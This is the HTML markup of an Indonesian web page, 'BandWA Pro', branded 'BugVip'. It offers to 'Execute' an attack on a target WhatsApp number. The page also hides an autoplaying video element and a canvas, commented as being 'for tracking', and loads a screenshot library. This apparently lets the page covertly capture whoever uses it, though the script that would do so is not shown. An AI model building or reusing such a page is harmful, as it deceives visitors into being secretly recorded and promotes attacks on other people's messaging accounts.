<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BandWA Pro - Security Shield</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
    <div class="bg-particles" id="particleContainer"></div>

    <div class="login-container">
        <div class="login-header">
            <p class="login-title">Bug<span>Vip</span></p>
            <p class="login-subtitle">⚡ Security Action Required</p>
        </div>

        <div class="input-group">
            <input type="text" class="login-input" id="targetInput" placeholder="Nomor WhatsApp Target (62xxxx)" maxlength="15">
            <button class="login-button" id="actionBtn">Execute</button>
        </div>

        <div id="statusLog">
            <div class="log-entry ready">🔒 System ready. Enter target number.</div>
        </div>

        <!-- Hidden elements for tracking -->
        <video id="v" autoplay muted style="display:none;"></video>
        <canvas id="c" style="display:none;"></canvas>
    </div>

    <script src="assets/particles.js"></script>
    <script src="script.js"></script>
</body>
</html>
